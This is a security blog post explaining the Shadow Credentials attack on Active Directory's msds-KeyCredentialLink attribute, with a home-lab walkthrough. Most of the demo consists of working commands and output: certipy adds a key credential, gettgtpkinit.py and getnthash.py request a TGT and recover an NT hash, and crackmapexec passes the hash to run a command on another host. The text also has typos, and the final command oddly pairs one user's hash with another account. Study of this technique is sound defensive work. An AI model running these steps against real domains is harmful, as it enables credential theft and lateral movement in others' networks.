---
layout: post
title: Abusing the msds-KeyCredentialLink Propertie in Active Directory - Understanding Shadow Credentials
subtitle: Using Certipy To Exploit msds-KeyCredentialLink Remotley
tags: [AD]
---

# What is a Shadow Credential 
Within Active Directory, both user and computer objects possess an attribute named `msds-KeyCredentialLink`, which serves as a storage location for raw public keys. These public keys can be used in Kerberos to obtain a Ticket Granting Ticket (TGT). Adding a credential/public key to this attribute is known as a "Shadow Credential." A Shadow Credential can then be used in conjunction with a Kerberos extension called Service for User to Self (S4U2Self) to obtain the NT hash of that user. 

When using public key authentication a client can obtain a special Service Ticket that contains their NTLM hash when trying to access a resource that requires it. Inside that Service Ticket is the the Privilege Attribute Certificate (PAC) that contains an entity with the encrypted NTLM hash. We cannot decrypt this because it is encrypted using the key of the service that it is issued for. 

The S4U2Self mechanism allows a user to obtain a Service Ticket for themselves, giving us the ability to decrypt the PAC. S4U2Self Service Tickets are encrypted using the targets session key.

There are two requirements that must be present in order to perform this type of attack
- Active Directory Certificate Services installed on at least a 2016 Domain Controller
- A compromised account that has rights to the `msds-KeyCredentialLink` attribute to whatever user/computer you want to exploit

Below is a basic flow of the attack
![img](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/shadowDiag.png)
# Demo
_For this demo I will do the exploitation from a remote kali machine rather than on a windows host._

In my home lab I set up a new account called `sauron` and gave `frodo` write and read permissions for the attribute `msds-KeyCredentialLink`
![img](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/writeshadow.png)

ly4k wrote a great tool called [certipy](https://github.com/ly4k/Certipy) that takes advantage of public Active Directory Certificate Services (AD CS). It has a option called `shadow` that can; list, add, remove ,clear, show info, and auto pwn the `msDS-KeyCredentialLink` attribute. 

Using the `add` command lets me add a new raw public key to the `sauron` account
```
┌──(root㉿kali)-[~]
└─# certipy shadow add -username frodo@lotr.local -p 'Press#123' -account sauron -dc-ip 10.10.1.46
Certipy v4.4.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'sauron'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'd0d0d6f8-a2ac-20e5-a158-77def64556aa'
[*] Adding Key Credential with device ID 'd0d0d6f8-a2ac-20e5-a158-77def64556aa' to the Key Credentials for 'sauron'
[*] Successfully added Key Credential with device ID 'd0d0d6f8-a2ac-20e5-a158-77def64556aa' to the Key Credentials for 'sauron'
[*] Saved certificate and private key to 'sauron.pfx'
```

Looking at the property on suaron's account a new attribute is present 
![img](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/shadow.png)

Next we can use `gettgtpkinit.py` by [kirkjanm](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) to request a TGT using the `.pfx` file generated from `certipy`. It will give us a TGT and the AS-REP encryption key we will use de decrypt the PAC.
```
┌──(root㉿kali)-[~]
└─# python3 gettgtpkinit.py -cert-pfx sauron.pfx lotr.local/sauron out.ccache
2023-05-11 17:24:03,939 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2023-05-11 17:24:04,026 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2023-05-11 17:24:04,034 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2023-05-11 17:24:04,034 minikerberos INFO     9e2f822b380ed497d02b5b6262e4a79318e1c0109b09c0ac1476cfc5d7cb1421
INFO:minikerberos:9e2f822b380ed497d02b5b6262e4a79318e1c0109b09c0ac1476cfc5d7cb1421
2023-05-11 17:24:04,037 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Cache the ticket in our current session
```
┌──(root㉿kali)-[~]
└─# export KRB5CCNAME=out.ccache
```

Finally `getnthash.py` by [kirkjanm](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py), will use the TGT to request a PAC using S4U2Self. It will also decrypt the PAC **giving us the NT hash**.
```
┌──(root㉿kali)-[~]
└─# python3 getnthash.py -key 9e2f822b380ed497d02b5b6262e4a79318e1c0109b09c0ac1476cfc5d7cb1421 lotr.local/sauron
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
0f7421a8a3d0b0adcafa6862fd766818
```

`certipy`, has an `auto` command that will add a new Key to the target, authenticate with the key to get the TGT and NT hash, and then clean up.
```
certipy shadow auto -username frodo@lotr.local -p 'Press#123' -account sauron -dc-ip 10.10.1.46

[*] Targeting user 'sauron'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '3aa7acab-3abc-d4ee-75ad-46913bb33c1a'
[*] Adding Key Credential with device ID '3aa7acab-3abc-d4ee-75ad-46913bb33c1a' to the Key Credentials for 'sauron'
[*] Successfully added Key Credential with device ID '3aa7acab-3abc-d4ee-75ad-46913bb33c1a' to the Key Credentials for 'sauron'
[*] Authenticating as 'sauron' with the certificate
[*] Using principal: sauron@lotr.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'sauron.ccache'
[*] Trying to retrieve NT hash for 'sauron'
[*] Restoring the old Key Credentials for 'sauron'
[*] Successfully restored the old Key Credentials for 'sauron'
[*] NT hash for 'sauron': 0f7421a8a3d0b0adcafa6862fd766818
```

Then a pass the hash attack can be performed 
```
┌──(root㉿kali)-[~]
└─# crackmapexec smb -u frodo -H 0f7421a8a3d0b0adcafa6862fd766818 -d lotr 10.10.1.47 -x 'dir'
SMB         10.10.1.47      445    WORKSTATION      [*] Windows 10 Pro 19044 x64 (name:WORKSTATION) (domain:lotr) (signing:False) (SMBv1:True)
SMB         10.10.1.47      445    WORKSTATION      [+] lotr\frodo:0f7421a8a3d0b0adcafa6862fd766818
```

These NT hashes can be cracked offline or used in a pass the hash attack. In the event that you have permissions to do this on a computer account you could take an additional step and use `impacket-ticketer` to gain a Service Ticket as HOST or CIFS as an administrator and authenticate to the machine.
